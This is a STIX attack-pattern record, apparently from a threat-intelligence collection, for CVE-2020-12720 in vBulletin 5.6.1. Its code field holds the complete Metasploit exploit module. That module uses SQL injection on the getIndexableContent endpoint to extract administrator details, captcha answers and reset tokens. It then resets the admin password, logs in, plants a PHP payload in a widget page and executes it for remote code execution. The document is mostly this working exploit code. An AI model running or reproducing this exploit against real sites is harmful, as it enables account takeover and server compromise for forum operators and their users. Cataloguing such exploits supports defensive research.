{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--74ad7800-7d67-4929-b7d2-92d3bda22a70",
    "created": "2024-08-14T17:08:09.832426Z",
    "modified": "2024-08-14T17:08:09.83243Z",
    "name": "vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection",
    "description": " This module exploits a SQL injection vulnerability found in vBulletin 5.6.1 and earlier This module uses the getIndexableContent vulnerability to reset the administrators password it then uses the administrators login information to achieve RCE on the target. This module has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux distribution.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vbulletin_getindexablecontent.rb",
            "external_id": "vbulletin_getindexablecontent.rb"
        },
        {
            "source_name": "CharlesFol<folcharlesatgmail.com>",
            "external_id": "#(@cfreal_)CVE"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12720"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  HttpFingerprint = { method: 'GET', uri: '/', pattern: [/vBulletin.version = '5.+'/] }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection',\n        'Description' => %q{\n          This module exploits a SQL injection vulnerability found in vBulletin 5.6.1 and earlier\n          This module uses the getIndexableContent vulnerability to reset the administrators password,\n          it then uses the administrators login information to achieve RCE on the target. This module\n          has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux distribution.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Charles Fol <folcharles[at]gmail.com>', # (@cfreal_) CVE\n          'Zenofex <zenofex[at]exploitee.rs>', # (@zenofex) PoC and Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-12720'],\n        ],\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-03-12',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to vBulletin', '/']),\n      OptInt.new('NODE', [false, 'Valid Node ID']),\n      OptInt.new('MINNODE', [true, 'Valid Node ID', 1]),\n      OptInt.new('MAXNODE', [true, 'Valid Node ID', 200]),\n      OptBool.new('MANUALLOSTPASS', [false, 'true if an administrator lost password request has already been sent.', false])\n    ])\n  end\n\n  # Performs SQLi attack\n  def do_sqli(node_id, tbl_prfx, field, table, condition)\n    where_cond = condition.nil? || condition == '' ? '' : \"where #{condition}\"\n    injection = \" UNION ALL SELECT 0x2E,0x74,0x68,0x65,0x2E,0x65,0x78,0x70,0x6C,0x6F,0x69,0x74,0x65,0x65,0x72,0x73,0x2E,#{field},0x2E,0x7A,0x65,0x6E,0x6F,0x66,0x65,0x78 \"\n    injection << \"from #{tbl_prfx}#{table} #{where_cond}--\"\n\n    print_status(\"Performing SQL injection on target to retrieve '#{field}' from '#{tbl_prfx}#{table}'.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'content_infraction', 'getIndexableContent'),\n      'vars_post' => {\n        'nodeId[nodeid]' => \"#{node_id}#{injection}\"\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['rawtext']\n\n    parsed_resp['rawtext']\n  end\n\n  # Gets human verification token\n  def get_hv_hash\n    print_status(\"Making request to '#{target_uri.path}/ajax/api/hv/generateToken' to retrieve HV token.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'hv', 'generateToken'),\n      'vars_post' => {\n        'securitytoken' => 'guest'\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['hash']\n\n    hv_hash = parsed_resp['hash']\n    print_good(\"Retrieved '#{hv_hash}' human verification token.\")\n    hv_hash\n  end\n\n  # Gets the human verification (question based) answer\n  def get_hv_ques_answer(node_id, tbl_prfx, questionid)\n    print_status(\"Using HV token '#{questionid}' and SQLinjection to determine HV question answer.\")\n    hv_answer = do_sqli(node_id, tbl_prfx, 'regex', 'hvquestion', \"questionid = '#{questionid}'\")\n\n    if questionid.nil?\n      return nil\n    end\n\n    print_good(\"Retrieved the answer '#{hv_answer}' (REGEX) to the HV question with id '#{questionid}'.\")\n    hv_answer\n  end\n\n  # Gets the human verification (image based) answer\n  def get_hv_answer(node_id, tbl_prfx, hv_hash)\n    print_status(\"Using HV token '#{hv_hash}' and SQLinjection to determine HV answer.\")\n    hv_answer = do_sqli(node_id, tbl_prfx, 'answer', 'humanverify', \"hash = '#{hv_hash}'\")\n\n    if hv_answer.nil?\n      return nil\n    end\n\n    print_good(\"Retrieved '#{hv_answer}' answer to HV token '#{hv_hash}'.\")\n    hv_answer\n  end\n\n  # Gets the prefix to the SQL tables used in vbulletin install\n  def get_table_prefix(node_id)\n    print_status('Attempting to determine the vBulletin table prefix.')\n    table_name = do_sqli(node_id, '', 'table_name', 'information_schema.columns', \"column_name='phrasegroup_cppermission'\")\n\n    unless table_name && table_name.split('language').index\n      fail_with(Failure::Unknown, 'Could not determine the vBulletin table prefix.')\n    end\n\n    tbl_prefix = table_name.split('language')[0]\n    print_good(\"Sucessfully retrieved table to get prefix from #{table_name}.\")\n\n    tbl_prefix\n  end\n\n  # Sends the request to begin forgot password request\n  def begin_reset_pass(admin_email, hv_answer, hv_hash, type = 'Image')\n    print_status(\"Making request to '#{target_uri.path}/auth/lostpw' to begin lost password process.\")\n    if type == 'Question'\n      hv_field_name1 = 'humanverify[input]'\n      hv_field_name2 = 'humanverify[hash]'\n    elsif type == 'Recaptcha2'\n      hv_field_name1 = 'unused'\n      hv_field_name2 = 'humanverify[g-recaptcha-response]'\n    else\n      hv_field_name1 = 'humanverify[input]'\n      hv_field_name2 = 'humanverify[hash]'\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'auth', 'lostpw'),\n      'vars_post' => {\n        'email' => admin_email.to_s,\n        hv_field_name1.to_s => hv_answer.to_s,\n        hv_field_name2.to_s => hv_hash.to_s,\n        'securitytoken' => 'guest'\n      }\n    })\n\n    return false unless res && res.code == 200\n\n    parsed_resp = res.get_json_document\n\n    return false if parsed_resp['response'] && parsed_resp['response']['errors']\n\n    true\n  end\n\n  # Attempts to login to vBulletin install\n  def login(user, pass, type = '')\n    print_status(\"Making login request to '#{target_uri.path}/auth/ajax-login' with username: '#{user}' and password: '#{pass}'.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'auth', 'ajax-login'),\n      'vars_post' => {\n        logintype: type.to_s,\n        'username' => user.to_s,\n        'password' => pass.to_s,\n        'securitytoken' => 'guest'\n      }\n    })\n\n    return [nil, nil] unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['success']\n\n    print_good(\"Successfully logged in as #{user} #{type}.\")\n\n    [res.get_cookies, parsed_resp['newtoken']]\n  end\n\n  # Gets an administrator's info from the database using SQLi\n  def get_admin_info(node_id, tbl_prefix)\n    uid = do_sqli(node_id, tbl_prefix, 'userid', 'administrator', nil)\n    username = do_sqli(node_id, tbl_prefix, 'username', 'user', \"userid = '#{uid}'\")\n    token = do_sqli(node_id, tbl_prefix, 'token', 'user', \"userid = '#{uid}'\")\n    email = do_sqli(node_id, tbl_prefix, 'email', 'user', \"userid = '#{uid}'\")\n\n    unless uid && username && token && email\n      return [nil, nil, nil, nil]\n    end\n\n    [uid, username, token, email]\n  end\n\n  # Activates vBulletin site builder\n  def activate_sitebuilder(pageid, nodeid, userid, sec_token, cookie_jar)\n    print_status(\"Making request to '#{target_uri.path}/ajax/activate-sitebuilder' to activate site-builder functionality.\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'activate-sitebuilder'),\n      'cookie' => [cookie_jar],\n      'headers' => {\n        'X-Requested-With' => 'XMLHttpRequest'\n      },\n      'vars_post' => {\n        'pageid' => pageid.to_s,\n        'nodeid' => nodeid.to_s,\n        'userid' => userid.to_s,\n        'loadMenu' => 'false',\n        'isAjaxTemplateRender' => 'true',\n        'isAjaxTemplateRenderWithData' => 'true',\n        'securitytoken' => sec_token.to_s\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp['errors']\n\n    print_good('Successfully enabled site-builder functionality.')\n    true\n  end\n\n  # Creates new widget instance\n  def new_widget_instance(sec_token, cookie_jar)\n    print_status(\"Making request to '#{target_uri.path}/ajax/api/widget/saveNewWidgetInstance' to create new widget.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'widget', 'saveNewWidgetInstance'),\n      'cookie' => [cookie_jar],\n      'vars_post' => {\n        'containerinstanceid' => '0',\n        'widgetid' => '23', # PHP widget type ID\n        'pagetemplateid' => '',\n        'securitytoken' => sec_token.to_s\n      }\n    })\n\n    return [nil, nil] unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['widgetinstanceid']\n\n    print_good('Created new widget instance.')\n\n    [parsed_resp['widgetinstanceid'], parsed_resp['pagetemplateid']]\n  end\n\n  # Saves a new widget to vBulletin.\n  def save_widget(pt_id, wi_id, payload, sec_token, cookie_jar)\n    print_status(\"Making request to '#{target_uri.path}/ajax/api/widget/saveAdminConfig' to add payload to widget.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'widget', 'saveAdminConfig'),\n      'cookie' => [cookie_jar],\n      'vars_post' => {\n        'widgetid' => '23', # PHP widget type ID\n        'pagetemplateid' => pt_id.to_s,\n        'widgetinstanceid' => wi_id.to_s,\n        'data[widget_type]' => '',\n        'data[title]' => rand_text_alphanumeric(rand(6..16)),\n        'data[show_at_breakpoints][desktop]' => '1',\n        'data[show_at_breakpoints][small]' => '1',\n        'data[show_at_breakpoints][xsmall]' => '1',\n        'data[hide_title]' => '1',\n        'data[module_viewpermissions][key]' => 'show_all',\n        'data[code]' => payload.encoded.to_s,\n        'securitytoken' => sec_token.to_s\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp['errors']\n\n    print_good('Successfully added payload to widget.')\n\n    true\n  end\n\n  # Sends request to reset password using activation id.\n  def reset_password(admin_uid, act_id, new_pass)\n    print_status(\"Sending reset password request to '#{target_uri.path}/auth/reset-password'.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'auth', 'reset-password'),\n      'headers' => {\n        'X-Requested-With' => 'XMLHttpRequest'\n      },\n      'vars_post' => {\n        'userid' => admin_uid.to_s,\n        'activationid' => act_id.to_s,\n        'new-password' => new_pass.to_s,\n        'new-password-confirm' => new_pass.to_s,\n        'securitytoken' => 'guest'\n      }\n    })\n\n    unless res && res.code == 200 && res.body.to_s =~ /Logging in/\n      return nil\n    end\n\n    print_good(\"User with userid '#{admin_uid}' successfully reset password to '#{new_pass}'.\")\n\n    true\n  end\n\n  # Deletes a page in vbulletin\n  def delete_page(pageid, login_token, cookie_jar)\n    print_status(\"Sending delete page request to '#{target_uri.path}/ajax/api/page/delete'.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'page', 'delete'),\n      'cookie' => [cookie_jar],\n      'headers' => {\n        'X-Requested-With' => 'XMLHttpRequest'\n      },\n      'vars_post' => {\n        'pageid' => pageid.to_s,\n        'securitytoken' => login_token.to_s\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp['errors']\n\n    print_good(\"Successfully deleted page with pageid: #{pageid}\")\n\n    true\n  end\n\n  # Makes request to execute PHP payload.\n  def exec_payload(rest_url)\n    print_status(\"Sending request to '#{normalize_uri(target_uri.path, rest_url)}' to execute payload.\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, rest_url)\n    })\n\n    unless res && res.code == 200\n      return nil\n    end\n\n    print_good('Request made succesfully, payload should be executing now.')\n\n    true\n  end\n\n  # Fetches a human verification question based on hash.\n  def get_hv_question(hash)\n    print_status(\"Sending request to '#{target_uri.path}/ajax/api/hv/fetchHvQuestion' to get human verification question.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'hv', 'fetchHvQuestion'),\n      'vars_post' => {\n        'hash' => hash.to_s\n      }\n    })\n\n    unless res && res.code == 200 && res.body.to_s !~ /\"errors\"/\n      return nil\n    end\n\n    res.body.to_s.tr('\"', '')\n  end\n\n  # Saves a new page to the vBulletin install\n  def save_page(nodeid, userid, pt_id, payload_url, wi_id, session_info)\n    print_status(\"Sending request to '#{target_uri.path}/admin/savepage' to save new page at '#{payload_url}'.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'savepage'),\n      'cookie' => [session_info[1]],\n      'vars_post' => {\n        'input[ishomeroute]' => '0',\n        'input[pageid]' => '0',\n        'input[nodeid]' => nodeid.to_s,\n        'input[userid]' => userid.to_s,\n        'input[screenlayoutid]' => '2',\n        'input[templatetitle]' => rand_text_alphanumeric(rand(5..10)),\n        'input[displaysections[0]]' => '[]',\n        'input[displaysections[1]]' => '[]',\n        'input[displaysections[2]]' => \"[{\\\"widgetId\\\":\\\"23\\\",\\\"widgetInstanceId\\\":\\\"#{wi_id}\\\"}]\",\n        'input[displaysections[3]]' => '[]',\n        'input[pagetitle]' => rand_text_alphanumeric(rand(5..10)),\n        'input[resturl]' => payload_url.to_s,\n        'input[metadescription]' => rand_text_alphanumeric(rand(5..10)),\n        'input[pagetemplateid]' => pt_id.to_s,\n        'url' => normalize_uri(target_uri.path),\n        'securitytoken' => session_info[0].to_s\n      }\n    })\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['success']\n\n    print_good(\"Page succesfully created and should be accessible at '#{normalize_uri(target_uri.path, payload_url.to_s)}'.\")\n\n    parsed_resp['pageid']\n  end\n\n  # Gets human verification type (options: \"Question\" | \"Image\" | Recaptcha2 | \"Disabled\")\n  def get_hv_type\n    print_status(\"Sending request to '#{target_uri.path}/ajax/api/hv/fetchHvType' to get human verification type.\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'hv', 'fetchHvType')\n    })\n\n    unless res && res.code == 200\n      return nil\n    end\n\n    hv_type = res.body.to_s.tr('\"', '')\n    print_good(\"Retrieved HV/captcha type of '#{hv_type}'.\")\n\n    hv_type.to_s.tr(\"'\", '')\n  end\n\n  # Brute force a nodeid (attack requires a valid nodeid)\n  def brute_force_node\n    min = datastore['MINNODE']\n    max = datastore['MAXNODE']\n\n    if min > max\n      print_error(\"MINNODE can't be major than MAXNODE.\")\n      return nil\n    end\n\n    for node_id in min..max\n      if exists_node?(node_id)\n        return node_id\n      end\n    end\n\n    nil\n  end\n\n  # Checks if a nodeid is valid\n  def exists_node?(id)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'node', 'getNode'),\n      'vars_post' => {\n        'nodeid' => id.to_s\n      }\n    })\n\n    unless res && res.code == 200\n      return nil\n    end\n\n    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp['errors']\n\n    print_good(\"Sucessfully found node at id #{id}\")\n    true\n  end\n\n  # Gets a node through BF or user supplied value\n  def get_node\n    if datastore['NODE'].nil? || datastore['NODE'] <= 0\n      print_status('Brute forcing to find a valid node id.')\n      return brute_force_node\n    end\n\n    print_status(\"Checking node id '#{datastore['NODE']}'.\")\n    return datastore['NODE'] if exists_node?(datastore['NODE'])\n\n    nil\n  end\n\n  # Check function for exploit\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'js', 'login.js')\n    })\n\n    return CheckCode::Unknown unless res && res.code == 200\n\n    return CheckCode::Safe if res.body.to_s =~ /vBulletin 5\\.6\\.1 Patch Level 1/\n\n    if res.body.to_s =~ /vBulletin ([.0-9]+)/\n      if Rex::Version.new(Regexp.last_match(1)) > Rex::Version.new('5.6.1')\n        return CheckCode::Safe\n      elsif Rex::Version.new(Regexp.last_match(1)) > Rex::Version.new('5.0.0')\n        return CheckCode::Appears\n      end\n\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n  # Performs all exploit functionality\n  def exploit\n    # Get node_id for requests\n    node_id = get_node\n    fail_with(Failure::Unknown, 'Could not get a valid node id for the vBulletin install.') unless node_id\n\n    # Get vBulletin table prefix\n    table_prfx = get_table_prefix(node_id)\n\n    # Get admin info (email, uid, token)\n    admin_uid, admin_user, admin_token, admin_email = get_admin_info(node_id, table_prfx)\n    unless admin_uid && admin_user && admin_token && admin_email\n      fail_with(Failure::UnexpectedReply, 'Could not retrieve administrator uid, username, email and token.')\n    end\n    print_good(\"Retrieved administrator uid: #{admin_uid} user: #{admin_user} email: #{admin_email} and password: #{admin_token}\")\n\n    if !datastore['MANUALLOSTPASS']\n      # Determine HV type\n      hv_type = get_hv_type\n\n      fail_with(Failure::Unknown, 'Invalid human verification type, you must request a new password for the administrator manually (and set MANUALLOSTPASS).') unless ['Image', 'Question', 'Recaptcha2', 'Disabled'].include? hv_type\n\n      fail_with(Failure::Unknown, \"Site uses Recaptcha2, retry with MANUALLOSTPASS enabled and after a lost password request to an administrator account (#{admin_email})\") unless ['Recaptcha2', 'Disabled'].exclude? hv_type\n\n      # Generate HV token and get answer\n      if hv_type == 'Image' && hv_type != 'Disabled'\n        hv_hash = get_hv_hash\n        hv_answer = get_hv_answer(node_id, table_prfx, hv_hash)\n        fail_with(Failure::UnexpectedReply, 'Could not retrieve human verification hash or answer.') unless hv_hash && hv_answer\n\n      elsif hv_type == 'Question' && hv_type != 'Disabled'\n        hv_hash = get_hv_hash\n        fail_with(Failure::UnexpectedReply, 'Could not retrieve human verification question hash.') unless hv_hash\n\n        ques_id = get_hv_answer(node_id, table_prfx, hv_hash)\n        fail_with(Failure::UnexpectedReply, 'Could not retrieve human verification question id.') unless ques_id\n\n        hv_question = get_hv_question(hv_hash)\n        hv_answer = get_hv_ques_answer(node_id, table_prfx, ques_id)\n        fail_with(Failure::UnexpectedReply, 'Could not retrieve human verification question or answer.') unless hv_question && hv_answer\n\n        print_good(\"Retrieved the HV question '#{hv_question}' and answer '#{hv_answer}' (regex).\")\n      end\n\n      # Make request to forget my password\n      brp_ret = begin_reset_pass(admin_email, hv_answer, hv_hash, hv_type)\n\n      # We fail here when the answer to the HV question contains a complex regex or is recaptcha2\n      fail_with(Failure::Unknown, 'Site requires captcha that we cannot bypass.') unless brp_ret\n    end\n\n    # Get Activation ID for forgot password request from DB\n    activation_id = do_sqli(node_id, table_prfx, 'activationid', 'useractivation', \"userid = '#{admin_uid}'\")\n    fail_with(Failure::UnexpectedReply, 'Could not retrieve activation id for forgot password request.') unless activation_id\n\n    # Make request setting new password\n    new_pass = rand_text_alphanumeric(rand(10..16))\n    rp_ret = reset_password(admin_uid, activation_id, new_pass)\n    fail_with(Failure::UnexpectedReply, \"Error attempting to reset password with activation id '#{activation_id}'.\") unless rp_ret\n\n    # Login to vBulletin\n    cookie_jar, login_token = login(admin_user, new_pass)\n    fail_with(Failure::NoAccess, \"Could not login with username: '#{admin_user}' and password: '#{new_pass}'.\") unless login_token\n\n    # Activate Site Builder (is this necessary?!)\n    actsb_ret = activate_sitebuilder(1, node_id, admin_uid, login_token, cookie_jar)\n    fail_with(Failure::UnexpectedReply, 'Could not activate site builder.') unless actsb_ret\n\n    # Login to vBulletin\n    cookie_jar, login_token = login(admin_user, new_pass, 'cplogin')\n    fail_with(Failure::NoAccess, \"Could not login to CP with username: '#{admin_user}' and password: '#{new_pass}'.\") unless login_token\n\n    # Create new widget\n    wi_id, pt_id = new_widget_instance(login_token, cookie_jar)\n    fail_with(Failure::UnexpectedReply, 'Could not create new widget instance.') unless wi_id && pt_id\n\n    # Save modifications to widget\n    sw_ret = save_widget(pt_id, wi_id, payload, login_token, cookie_jar)\n    fail_with(Failure::UnexpectedReply, 'Could not save payload modifications into widget instance.') unless sw_ret\n\n    # Add page with widget embedded\n    payload_url = rand_text_alphanumeric(rand(6..10))\n    session_info = [login_token, cookie_jar]\n    page_id = save_page(node_id, admin_uid, pt_id, payload_url, wi_id, session_info)\n    fail_with(Failure::UnexpectedReply, 'Could not save newly created page with malicious widget.') unless page_id\n\n    # Execute php payload\n    print_good(\"Executing PHP payload (#{payload.encoded.length} bytes) at #{normalize_uri(target_uri.path, payload_url)}.\")\n    exec_payload(payload_url)\n\n    # Delete page with widget embedded within it\n    dp_ret = delete_page(page_id, login_token, cookie_jar)\n    print_bad('Could not delete page (cleanup phase).') unless dp_ret\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-03-12",
    "x_mitre_platforms": [
        "php'"
    ]
}